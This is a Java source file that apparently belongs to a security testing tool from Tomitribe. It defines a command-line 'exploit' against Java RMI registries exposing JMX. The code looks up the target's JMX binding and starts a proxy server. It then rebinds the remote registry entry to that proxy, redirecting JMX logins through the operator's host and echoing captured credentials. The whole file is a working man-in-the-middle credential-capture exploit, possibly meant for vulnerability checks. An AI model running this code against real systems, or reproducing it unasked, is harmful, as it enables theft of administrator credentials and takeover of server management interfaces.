/*
 * Tomitribe Confidential
 *
 * Copyright Tomitribe Corporation. 2019
 *
 * The source code for this program is not published or otherwise divested
 * of its trade secrets, irrespective of what has been deposited with the
 * U.S. Copyright Office.
 */
package org.tomitribe.rmi;

import org.tomitribe.crest.api.Command;
import org.tomitribe.crest.api.Default;
import org.tomitribe.crest.api.Option;
import org.tomitribe.crest.api.Required;
import org.tomitribe.crest.api.StreamingOutput;

import javax.management.remote.JMXServiceURL;
import javax.management.remote.rmi.RMIConnectorServer;
import javax.management.remote.rmi.RMIServer;
import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.lang.management.ManagementFactory;
import java.net.InetAddress;
import java.net.ServerSocket;
import java.net.UnknownHostException;
import java.rmi.NotBoundException;
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.RMIServerSocketFactory;
import java.util.HashMap;
import java.util.Map;

public class ExploitCommands {

    @Command
    public StreamingOutput exploit(final @Required @Option({"host"}) String host,
                                   final @Required @Option({"port"}) Integer port,
                                   final @Default("40000") @Option("localport") Integer localport,
                                   final @Default("false") @Option("intercept") Boolean intercept,
                                   final @Default("jmxrmi") @Option("binding") String binding) {
        return new StreamingOutput() {
            @Override
            public void write(final OutputStream outputStream) {
                final PrintWriter pw = new PrintWriter(outputStream);

                Registry registry = null;
                Remote server;

                try {
                    registry = LocateRegistry.getRegistry(host, port);
                    server = registry.lookup(binding);
                    if (!RMIServer.class.isInstance(server)) {
                        pw.println(binding  + " is not bound to an RMI Server");
                        listBindings(registry, pw);
                        pw.flush();
                        return;

                    }
                } catch (RemoteException | NotBoundException e) {
                    pw.println("Unable to lookup " + binding + ".");
                    try {
                        listBindings(registry, pw);
                    } catch (RemoteException ex) {
                        // ignore
                    }
                    pw.flush();
                    return;
                }

                final RMIServer stub = RMIServer.class.cast(server);
                ProxyRMIJRMPServerImpl proxyServer;
                Remote jmxServer;

                try {
                    pw.println("Starting proxy server on port " + localport);
                    pw.flush();

                    final Map<String,Object> env = new HashMap<>();
                    proxyServer = new ProxyRMIJRMPServerImpl(localport,
                            null,
                            new RmiServerBindSocketFactory("0.0.0.0"),
                            env,
                            stub,
                            pw,
                            intercept);

                    final RMIConnectorServer cs = new RMIConnectorServer(
                            new JMXServiceURL("service:jmx:rmi://localhost"),
                            env,
                            proxyServer,
                            ManagementFactory.getPlatformMBeanServer());

                    cs.start();
                    jmxServer = proxyServer.toStub();
                } catch (IOException e) {
                    pw.println("Unable to create proxy. Check the localport setting");
                    pw.flush();
                    return;
                }

                pw.println("Proxy started on port " + localport);
                pw.println("Credentials captured upon login will be echoed here.");
                pw.flush();

                try {
                    registry.rebind(binding, jmxServer);

                    // check that this succeeded
                    final Remote check = registry.lookup(binding);
                    if (check.equals(server)) {
                        try {
                            proxyServer.close();
                        } catch (IOException e) {
                            pw.println("Unable to stop proxy server.");
                            pw.flush();
                        }

                        pw.println("Re-bind appears to be a no-op, server doesn't appear to be vulnerable");
                        pw.flush();
                        return;
                    }
                } catch (NotBoundException | RemoteException e) {
                    try {
                        proxyServer.close();
                    } catch (IOException ioe) {
                        pw.println("Unable to stop proxy server.");
                        pw.flush();
                    }

                    pw.println("Re-bind failed, server doesn't appear to be vulnerable");
                    pw.flush();
                }

                pw.println("Redirected JMX on target to tcp/40000 on this host. Listening for connections to proxy...");
                pw.flush();

                final Registry theRegistry = registry;

                Runtime.getRuntime().addShutdownHook(new Thread() {
                    @Override
                    public void run() {
                        // bind back the original server on exit
                        try {
                            theRegistry.rebind(binding, server);
                        } catch (RemoteException e) {
                            pw.println("Unable to rebind original server.");
                            pw.flush();
                        }

                        try {
                            proxyServer.close();
                        } catch (IOException e) {
                            pw.println("Unable to stop proxy server.");
                            pw.flush();
                        }
                    }
                });

            }

            private void listBindings(Registry registry, PrintWriter pw) throws RemoteException {
                if (registry == null) {
                    return;
                }

                final String[] bindings = registry.list();
                if (bindings != null) {
                    pw.println("Bindings available: ");
                    for (final String b : bindings) {
                        pw.println("\t" + b);
                    }
                }
            }
        };
    }

    public static class RmiServerBindSocketFactory implements RMIServerSocketFactory {
        private final InetAddress bindAddress;

        public RmiServerBindSocketFactory(String address) {
            InetAddress bindAddress = null;
            try {
                bindAddress = InetAddress.getByName(address);
            } catch (UnknownHostException e) {

            }

            this.bindAddress = bindAddress;
        }

        @Override
        public ServerSocket createServerSocket(int port) throws IOException  {
            return new ServerSocket(port, 0, bindAddress);
        }
    }
}
